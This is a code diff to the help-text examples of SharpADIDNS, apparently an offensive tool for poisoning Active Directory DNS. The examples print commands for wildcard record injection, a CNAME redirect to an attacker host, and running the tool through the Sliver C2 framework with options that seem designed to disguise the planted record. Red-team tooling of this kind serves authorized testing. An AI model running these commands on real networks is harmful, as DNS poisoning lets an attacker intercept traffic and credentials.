@@ -2610,24 +2610,26 @@ namespace SharpADIDNS
 
         private static void PrintExamples()
         {
-            Console.WriteLine("EXAMPLES");
-            Console.WriteLine("  # Recon: enumerate every dnsNode in the zone");
-            Console.WriteLine("  SharpADIDNS.exe enum --zone redteamnotes.local --dn DC=redteamnotes,DC=local --server dc.redteamnotes.local");
+            Console.WriteLine("EXAMPLES   (see docs/RECIPES.md for end-to-end scenarios)");
             Console.WriteLine();
-            Console.WriteLine("  # Read one record");
-            Console.WriteLine("  SharpADIDNS.exe query --zone redteamnotes.local --name sccm --dn DC=redteamnotes,DC=local");
+            Console.WriteLine("  # Recon: list all dnsNode under a zone");
+            Console.WriteLine("  SharpADIDNS.exe enum --zone corp.local --dn DC=corp,DC=local");
             Console.WriteLine();
-            Console.WriteLine("  # Wildcard A injection (classic ADIDNS poisoning)");
-            Console.WriteLine("  SharpADIDNS.exe add --zone redteamnotes.local --name \"*\" --type A --data 10.0.0.66 --dn DC=redteamnotes,DC=local --ttl 600");
+            Console.WriteLine("  # Read one record + decode all blobs + ACL");
+            Console.WriteLine("  SharpADIDNS.exe query --zone corp.local --name sccm --dn DC=corp,DC=local");
             Console.WriteLine();
-            Console.WriteLine("  # AAAA record with explicit creds over LDAPS");
-            Console.WriteLine("  SharpADIDNS.exe add --zone redteamnotes.local --name web --type AAAA --data fe80::1 --dn DC=redteamnotes,DC=local --server dc.redteamnotes.local --username redteamnotes\\redpen --password 'RedteamN0t3s.' --ldaps");
+            Console.WriteLine("  # Wildcard A (classic ADIDNS poisoning)");
+            Console.WriteLine("  SharpADIDNS.exe add --zone corp.local --name \"*\" --type A \\");
+            Console.WriteLine("      --data 10.0.0.66 --dn DC=corp,DC=local --ttl 60");
             Console.WriteLine();
-            Console.WriteLine("  # CNAME redirect (preserves any AAAA on the same node)");
-            Console.WriteLine("  SharpADIDNS.exe add --zone redteamnotes.local --name printer --type CNAME --data attacker.redteamnotes.local --dn DC=redteamnotes,DC=local --force");
+            Console.WriteLine("  # Sliver execute-assembly recommended pattern");
+            Console.WriteLine("  SharpADIDNS.exe --c2 --username 'corp\\u' --password-base64 <b64> \\");
+            Console.WriteLine("      --zone corp.local --dn DC=corp,DC=local --server dc.corp.local \\");
+            Console.WriteLine("      add --name sccm --type A --data 10.0.0.66 \\");
+            Console.WriteLine("          --mimic-aging --set-owner 'corp\\DnsAdmins'");
             Console.WriteLine();
-            Console.WriteLine("  # Soft-delete (tombstone) instead of hard remove");
-            Console.WriteLine("  SharpADIDNS.exe disable --zone redteamnotes.local --name wpad --dn DC=redteamnotes,DC=local");
+            Console.WriteLine("  # Tombstone (soft delete; AD scavenges later)");
+            Console.WriteLine("  SharpADIDNS.exe disable --zone corp.local --name wpad --dn DC=corp,DC=local");
             Console.WriteLine();
         }
 
